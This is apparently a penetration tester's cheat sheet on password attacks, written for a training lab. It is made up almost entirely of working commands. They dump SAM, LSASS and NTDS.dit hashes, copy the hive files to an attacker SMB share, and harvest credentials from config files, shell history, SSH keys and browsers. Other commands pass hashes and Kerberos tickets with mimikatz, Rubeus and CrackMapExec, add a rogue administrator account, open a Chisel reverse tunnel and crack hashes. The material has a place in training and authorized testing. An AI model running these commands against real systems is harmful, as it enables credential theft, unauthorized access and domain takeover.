# Password Attacks

**Tags:** `#passwordcracking` `#passwords` `#auth` `#authentication` `#hashcat` `#PassTheHash` `#PassTheTicket` `#Kerberos`

---

## Tools

| Tool | Purpose |
|---|---|
| `hashcat` | GPU-accelerated hash cracking |
| `john` | CPU-based hash cracking |
| `hydra` | Online brute-force (protocols) |
| `crackmapexec` / `netexec` | SMB/AD spraying, hash passing |
| `evil-winrm` | WinRM shell with hash auth |
| `impacket-secretsdump` | Remote/local hash extraction |
| `impacket-psexec` | PtH shell via SMB |
| `mimikatz` | Windows credential extraction |
| `Rubeus` | Kerberos ticket attacks |
| `pypykatz` | Python mimikatz (parse LSASS dumps) |
| `LaZagne` | Multi-platform cred harvester |
| `mimipenguin` | Linux memory credential extraction |
| `CeWL` | Wordlist from website keywords |
| `username-anarchy` | Username permutation generator |
| `keytabextract.py` | Extract hashes from Kerberos keytab |
| `firefox_decrypt.py` | Decrypt Firefox saved passwords |
| `PCredz` | Extract creds from network captures |

---

## Attack Methodology

### Wordlist Generation

```bash
# Scrape keywords from target website
cewl https://www.example.com -d 3 -m 5 -w cewl_wordlist.txt

# Generate username permutations from first/last name list
./username-anarchy -i names.txt > usernames.txt
```

### Hashcat Mutation Rules

```bash
# Apply rules to mutate wordlist — outputs candidate passwords
hashcat --force password.list -r /usr/share/hashcat/rules/best64.rule --stdout | sort -u > mut_password.list

# Common custom rule examples (add to .rule file)
# $1   → append "1"
# ^A   → prepend "A"
# c    → capitalize first letter
# so0  → substitute o→0
```

### Common Hashcat Modes

| Mode | Hash Type |
|---|---|
| `0` | MD5 |
| `100` | SHA1 |
| `1000` | NTLM |
| `1800` | SHA-512 (Linux shadow) |
| `5600` | NTLMv2 (Net-NTLMv2) |
| `13100` | Kerberoast (TGS-REP) |
| `18200` | ASREPRoast (AS-REP) |
| `22100` | BitLocker |
| `3200` | bcrypt |

```bash
# Basic crack
hashcat -m 1000 hashes.txt /usr/share/wordlists/rockyou.txt

# With rules
hashcat -m 1000 hashes.txt /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule

# Show cracked
hashcat -m 1000 hashes.txt --show
```

### Common Password Patterns

| Pattern | Example |
|---|---|
| Capitalize first | `Password` |
| Append numbers | `Password123` |
| Append year | `Password2024` |
| Append `!` | `Password2024!` |
| Leet speak | `P@ssw0rd2024!` |

---

## Windows — SAM Hash Dumping

### Save Registry Hives (local admin required)

```cmd
reg.exe save hklm\sam C:\sam.save
reg.exe save hklm\system C:\system.save
reg.exe save hklm\security C:\security.save
```

| Hive | Contains |
|---|---|
| `hklm\sam` | Local account NTLM hashes |
| `hklm\system` | Bootkey to decrypt SAM |
| `hklm\security` | Cached domain credentials |

### Transfer to Kali

```bash
# Host SMB share on Kali
sudo python3 /usr/share/doc/python3-impacket/examples/smbserver.py -smb2support CompData /tmp/loot/

# From victim (cmd)
move C:\sam.save \\10.10.14.x\CompData\
move C:\system.save \\10.10.14.x\CompData\
move C:\security.save \\10.10.14.x\CompData\
```

### Dump Hashes

```bash
impacket-secretsdump -sam sam.save -security security.save -system system.save LOCAL
```

Output format: `uid:rid:lmhash:nthash`

---

## Windows — LSASS Memory Dumping

### GUI

Task Manager → find `lsass.exe` → right-click → **Create Dump File**

### CLI

```cmd
tasklist /svc
```

```powershell
Get-Process lsass
```

```cmd
rundll32 C:\windows\system32\comsvcs.dll, MiniDump 672 C:\lsass.dmp full
```

> Replace `672` with the actual PID of lsass.

### Parse Dump with Pypykatz

```bash
pypykatz lsa minidump /path/to/lsass.dmp
```

Key output sections:

| Section | Contains |
|---|---|
| `MSV` | NT hash + SHA1 hash |
| `WDIGEST` | Cleartext password (legacy, often empty) |
| `Kerberos` | TGT/TGS tickets |

```bash
# Crack extracted NT hash
hashcat -m 1000 64f12cddaa88057e06a81b54e73b949b /usr/share/wordlists/rockyou.txt
```

---

## Windows — Credential Manager

```cmd
cmdkey /list
```

```cmd
# Spawn process as stored user without knowing the password
runas /savecred /user:SRV01\mcharles cmd
```

**Vault paths:**

```
%UserProfile%\AppData\Local\Microsoft\Vault\
%UserProfile%\AppData\Local\Microsoft\Credentials\
%UserProfile%\AppData\Roaming\Microsoft\Vault\
%ProgramData%\Microsoft\Vault\
%SystemRoot%\System32\config\systemprofile\AppData\Roaming\Vault\
```

- `Policy.vpol` — AES key that encrypts vault, protected by DPAPI
- `rundll32 keymgr.dll,KRShowKeyMgr` — GUI export of stored credentials

---

## Windows — NTDS.dit Dumping (Domain Controller)

```cmd
# Create volume shadow copy
vssadmin CREATE SHADOW /For=C:

# Copy NTDS.dit from shadow copy
cmd.exe /c copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy2\Windows\NTDS\NTDS.dit c:\NTDS\NTDS.dit
```

Requires **local admin on the DC**.

### Remote (CrackMapExec)

```bash
crackmapexec smb 10.129.201.57 -u Administrator -p 'Password123' --ntds
```

### Crack Hashes

```bash
impacket-secretsdump -ntds NTDS.dit -system SYSTEM LOCAL

hashcat -m 1000 ntds_hashes.txt /usr/share/wordlists/rockyou.txt
```

---

## Windows — Credential Hunting

```cmd
findstr /SIM /C:"password" *.txt *.ini *.cfg *.config *.xml *.git *.ps1 *.yml
```

```powershell
# Recursive search
Select-String -Path C:\Users\*\Documents\* -Pattern "password|secret|token|key"

# LaZagne — dump all stored creds
.\LaZagne.exe all
.\LaZagne.exe browsers
```

**Common locations:**

- SYSVOL → Group Policy scripts/preferences
- IT/dev shares → hardcoded creds in scripts
- `unattend.xml` → plaintext local admin password
- AD user/computer description fields
- KeePass databases (`.kdbx`) — crack with hashcat mode `13400`
- `pass.txt`, `passwords.docx`, `passwords.xlsx` on shares/SharePoint

---

## Linux — Credential Harvesting

### Config Files

```bash
# Find and search config files
for l in $(echo ".conf .config .cnf"); do
  echo -e "\nExtension: $l"
  find / -name "*$l" 2>/dev/null | grep -v "lib\|fonts\|share\|core"
done

# Search .cnf files for credentials
for i in $(find / -name "*.cnf" 2>/dev/null | grep -v "doc\|lib"); do
  echo -e "\nFile: $i"
  grep "user\|password\|pass" "$i" 2>/dev/null | grep -v "#"
done

# Common specific targets
cat /var/www/html/config.php
cat /var/www/html/wp-config.php
cat /etc/mysql/mysql.conf.d/mysqld.cnf
find /var/www -name "*.php" | xargs grep -i "password\|passwd\|db_pass" 2>/dev/null
find / -name "*.env" -readable 2>/dev/null | xargs grep -l "password\|secret\|key" 2>/dev/null
```

### Database Files

```bash
for l in $(echo ".sql .db .*db .db*"); do
  echo -e "\nDB Extension: $l"
  find / -name "*$l" 2>/dev/null | grep -v "doc\|lib\|headers\|share\|man"
done
```

### Scripts & Other Files

```bash
# Scripts that may contain hardcoded creds
for l in $(echo ".py .pyc .pl .go .jar .c .sh"); do
  echo -e "\nExtension: $l"
  find / -name "*$l" 2>/dev/null | grep -v "doc\|lib\|headers\|share"
done

# Text files in home dirs
find /home/* -type f -name "*.txt" -o ! -name "*.*"
```

### Bash / Shell History

```bash
tail -n 5 /home/*/.bash_history
find / -name ".*_history" -readable 2>/dev/null
cat ~/.bash_history
cat ~/.zsh_history
```

### Cron Jobs

```bash
cat /etc/crontab
ls -la /etc/cron.*/
crontab -l
```

### SSH Keys

```bash
grep -rnw "PRIVATE KEY" /home/* 2>/dev/null | grep ":1"
grep -rnw "ssh-rsa" /home/* 2>/dev/null | grep ":1"
find / -name "id_rsa" -o -name "id_ed25519" -o -name "id_ecdsa" 2>/dev/null
find / -name "authorized_keys" 2>/dev/null
find / -name "*.pem" -o -name "*.ppk" 2>/dev/null
ls -la ~/.gnupg/
```

### Log Files

```bash
# Grep all logs for credential keywords
for i in $(ls /var/log/* 2>/dev/null); do
  GREP=$(grep -Ei "accepted|session opened|session closed|failure|failed|ssh|password changed|new user|delete user|sudo|COMMAND=|logs" "$i" 2>/dev/null)
  if [[ $GREP ]]; then
    echo -e "\n#### Log file: $i"
    echo "$GREP"
  fi
done
```

| Log | Purpose |
|---|---|
| `/var/log/auth.log` | Auth logs (Debian/Ubuntu) |
| `/var/log/secure` | Auth logs (RedHat/CentOS) |
| `/var/log/syslog` | General system activity |
| `/var/log/messages` | General messages |
| `/var/log/faillog` | Failed login attempts |
| `/var/log/cron` | Cron execution logs |
| `/var/log/mail.log` | Mail server logs |
| `/var/log/httpd` | Apache logs |
| `/var/log/mysqld.log` | MySQL logs |

### Memory — mimipenguin / LaZagne

```bash
sudo python3 mimipenguin.py
sudo bash mimipenguin.sh

sudo python2.7 laZagne.py all
python3 laZagne.py browsers
```

### Firefox Saved Passwords

```bash
ls -l ~/.mozilla/firefox/ | grep default
cat ~/.mozilla/firefox/1bplpd86.default-release/logins.json | jq .

# Decrypt
python3.9 firefox_decrypt.py
```

---

## Linux — PAM / /etc/passwd / /etc/shadow

```
/usr/lib/x86_64-linux-gnu/security/   ← PAM modules (pam_unix.so)
/etc/passwd                            ← User accounts
/etc/shadow                            ← Password hashes (root readable)
/etc/security/opasswd                  ← Old passwords (PAM password history)
```

**passwd format:**

| Field | Description |
|---|---|
| `cry0l1t3` | Login name |
| `x` | Password in shadow |
| `1000` | UID |
| `1000` | GID |
| `cry0l1t3,,,` | GECOS / comments |
| `/home/cry0l1t3` | Home dir |
| `/bin/bash` | Shell |

**shadow format:**

| Field | Description |
|---|---|
| `cry0l1t3` | Username |
| `$6$wBRzy$...` | Hash |
| `18937` | Last PW change (days since epoch) |
| `0` | Min PW age |
| `99999` | Max PW age |
| `7` | Warning period |

**Hash prefixes:**

| Prefix | Algorithm |
|---|---|
| `$1$` | MD5 |
| `$2a$` | Blowfish |
| `$2y$` | Eksblowfish |
| `$5$` | SHA-256 |
| `$6$` | SHA-512 |

- `!` or `*` in password field = account locked (no UNIX login)

### Crack /etc/shadow

```bash
sudo cp /etc/passwd /tmp/passwd.bak
sudo cp /etc/shadow /tmp/shadow.bak
unshadow /tmp/passwd.bak /tmp/shadow.bak > /tmp/unshadowed.hashes

hashcat -m 1800 -a 0 /tmp/unshadowed.hashes rockyou.txt -o /tmp/cracked.txt
```

---

## Network Credential Capture

```bash
# Live capture — view in Wireshark
# Look for: Basic Auth, FTP, Telnet, HTTP form posts, LDAP bind

# Extract creds from pcap
python3 /opt/PCredz/Pcredz -f capture.pcap
python3 /opt/PCredz/Pcredz -i eth0    # live interface
```

---

## Pass the Hash (PtH)

**Sources to get hashes:**
- SAM dump (local accounts)
- NTDS.dit dump (domain accounts)
- LSASS memory (active sessions)

### Windows — mimikatz

```cmd
privilege::debug
sekurlsa::logonpasswords
sekurlsa::pth /domain:inlanefreight.htb /user:Administrator /ntlm:64f12cddaa88057e06a81b54e73b949b /run:cmd
```

### Windows — Invoke-TheHash (PowerShell)

```powershell
Import-Module .\Invoke-TheHash.psd1
Invoke-SMBExec -Target 172.16.1.10 -Domain inlanefreight.htb -Username Administrator -Hash 64F12CDDAA88057E06A81B54E73B949B -Command "net user hacker Password123 /add && net localgroup administrators hacker /add" -Verbose
```

### Linux — impacket-psexec

```bash
impacket-psexec administrator@10.129.201.126 -hashes :30B3783CE2ABF1AF70F77D0660CF3453
```

### Linux — CrackMapExec

```bash
# Spray across subnet
crackmapexec smb 172.16.1.0/24 -u Administrator -d . -H 30B3783CE2ABF1AF70F77D0660CF3453

# Execute command
crackmapexec smb 10.129.201.126 -u Administrator -d . -H 30B3783CE2ABF1AF70F77D0660CF3453 -x whoami
```

### Linux — xfreerdp (RDP PtH)

```cmd
# First enable restricted admin mode on target
reg add HKLM\System\CurrentControlSet\Control\Lsa /t REG_DWORD /v DisableRestrictedAdmin /d 0x0 /f
```

```bash
xfreerdp /v:10.129.201.126 /u:julio /pth:64F12CDDAA88057E06A81B54E73B949B
```

> UAC note: `HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\LocalAccountTokenFilterPolicy` must be `1` for remote admin via PtH to work for local accounts.

### Linux — evil-winrm

```bash
evil-winrm -i 10.129.201.57 -u Administrator -H "64f12cddaa88057e06a81b54e73b949b"
```

---

## Pass the Ticket — Windows (Kerberos)

**TGT** (Ticket Granting Ticket) — First ticket, obtained at login, used to request TGS.
**TGS** (Ticket Granting Service) — Per-service ticket.

Both are stored/processed in LSASS. Admin = all users' tickets; non-admin = current user only.

### Export Tickets — mimikatz

```cmd
privilege::debug
sekurlsa::tickets /export       ← exports .kirbi files
```

- Tickets ending `$` = computer accounts
- Tickets ending `@` = service names

### Dump Tickets — Rubeus

```cmd
Rubeus.exe dump /nowrap          ← base64 encoded tickets
```

### OverPass the Hash (Hash → TGT)

```cmd
# mimikatz — spawn process with hash as Kerberos key
privilege::debug
sekurlsa::ekeys                  ← dump AES/NTLM encryption keys
sekurlsa::pth /domain:inlanefreight.htb /user:plaintext /ntlm:3f74aa8f08f712f09cd5177b5c1ce50f

# Rubeus — request TGT from hash
Rubeus.exe asktgt /domain:inlanefreight.htb /user:plaintext /aes256:b21c99fc068e3ab2ca789bccbef67de43791fd911c6e15ead25641a8fda3fe60 /nowrap
```

### Pass the Ticket

```cmd
# Rubeus — inject TGT (rc4/ntlm hash)
Rubeus.exe asktgt /domain:inlanefreight.htb /user:plaintext /rc4:3f74aa8f08f712f09cd5177b5c1ce50f /ptt

# Rubeus — inject from .kirbi file
Rubeus.exe ptt /ticket:[0;6c680]-2-0-40e10000-plaintext@krbtgt-inlanefreight.htb.kirbi

# Rubeus — inject from base64 ticket
[Convert]::ToBase64String([IO.File]::ReadAllBytes("ticket.kirbi"))
Rubeus.exe ptt /ticket:<base64>

# mimikatz — inject from .kirbi file
kerberos::ptt "C:\Users\plaintext\Desktop\Mimikatz\[0;6c680]-2-0-40e10000-plaintext@krbtgt-inlanefreight.htb.kirbi"
```

### PowerShell Remoting with Injected Ticket

```cmd
# Create sacrificial process, inject ticket, then PS remote
Rubeus.exe createnetonly /program:"C:\Windows\System32\cmd.exe" /show
Rubeus.exe asktgt /user:john /domain:inlanefreight.htb /aes256:9279bcbd40db957a0ed0d3856b2e67f9bb58e6dc7fc07207d0763ce2713f11dc /ptt
```

```powershell
Enter-PSSession -ComputerName DC01
```

---

## Pass the Ticket — Linux (Kerberos)

Linux AD-joined systems use Kerberos. Tickets stored as **ccache** files in `/tmp`.

### Locate Tickets

```bash
env | grep -i krb5          # KRB5CCNAME env var → current ccache location
ls /tmp/ | grep krb5cc      # ccache files
find / -name "*.ccache" 2>/dev/null
```

### Import a ccache Ticket

```bash
# Backup current session ticket first
cp $KRB5CCNAME /tmp/krb5cc_backup

# Set new ticket
export KRB5CCNAME=/tmp/krb5cc_647401106_I8I133
klist                        # verify
```

### Keytab Files

Keytab = Kerberos principal + encrypted key pairs for passwordless auth.

```bash
find / -name "*keytab*" -ls 2>/dev/null
crontab -l                  # look for kinit in cron — reveals keytab location
klist -k -t /etc/krb5.keytab    # read keytab
```

```bash
# Import a user's ticket via keytab (saves current ccache first)
cp $KRB5CCNAME /tmp/krb5cc_backup
kinit carlos@INLANEFREIGHT.HTB -k -t /opt/specialfiles/carlos.keytab
klist
```

### Extract Hashes from Keytab

```bash
python3 /opt/keytabextract.py /opt/specialfiles/carlos.keytab
./keytabextract.py file.keytab
```

Then crack extracted hashes with hashcat.

### Check Domain Join Status

```bash
realm list
ps -ef | grep -i "winbind\|sssd"
```

### Proxy for DC Access (Chisel)

When the victim can't reach the DC directly:

```bash
# Attacker
sudo ./chisel server --reverse -p 8080

# Victim
./chisel client 10.10.14.33:8080 R:socks
```

Then transfer the ccache and use proxychains for AD tools.

---

## Protected File Attacks

### Find Encrypted / Password-Protected Files

```bash
for ext in $(echo ".xls .xls* .xltx .csv .od* .doc .doc* .pdf .pot .pot* .pp*"); do
  echo -e "\nExtension: $ext"
  find / -name "*$ext" 2>/dev/null | grep -v "lib\|fonts\|share\|core"
done

grep -rnw "PRIVATE KEY" /* 2>/dev/null | grep ":1"
```

### john + conversion scripts

```bash
# Convert file format to john hash
office2john file.docx > file.hash
zip2john archive.zip > zip.hash
pdf2john file.pdf > pdf.hash
ssh2john id_rsa > id_rsa.hash
keepass2john database.kdbx > keepass.hash

john file.hash --wordlist=/usr/share/wordlists/rockyou.txt
john file.hash --show
```

### OpenSSL Encrypted Files

```bash
file GZIP.gzip
# GZIP.gzip: openssl enc'd data with salted password

for i in $(cat rockyou.txt); do
  openssl enc -aes-256-cbc -d -in GZIP.gzip -k $i 2>/dev/null | tar xz
done
```

### BitLocker (VHD/VHDx)

```bash
bitlocker2john -i Backup.vhd > backup.hashes
grep "bitlocker\$0" backup.hashes > backup.hash
hashcat -m 22100 backup.hash /usr/share/wordlists/rockyou.txt -o backup.cracked
```

### KeePass

```bash
keepass2john database.kdbx > keepass.hash
hashcat -m 13400 keepass.hash /usr/share/wordlists/rockyou.txt
```
